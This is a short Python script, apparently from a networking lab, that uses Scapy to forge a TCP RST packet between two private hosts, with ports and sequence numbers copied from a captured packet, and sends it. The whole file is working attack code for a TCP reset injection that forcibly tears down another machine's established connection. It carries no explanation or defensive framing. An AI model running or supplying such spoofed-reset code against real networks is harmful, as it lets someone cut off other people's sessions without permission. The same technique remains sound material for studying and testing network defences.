from scapy.all import *

# IP addresses
src_ip = '192.168.100.51'  # Source IP address
dst_ip = '192.168.100.50'  # Destination IP address

# Port numbers
src_port = 12345  # Destination port from the original packet
dst_port = 47902  # Source port from the original packet

# Sequence and acknowledgment numbers
seq_num = 16      # Sequence number from the original packet
ack_num = 2       # Acknowledgment number from the original packet

# Create IP and TCP layers
ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=src_port, dport=dst_port, flags='R', seq=seq_num, ack=ack_num)

# Combine layers into a single packet
rst_packet = ip/tcp

# Send the RST packet
send(rst_packet)
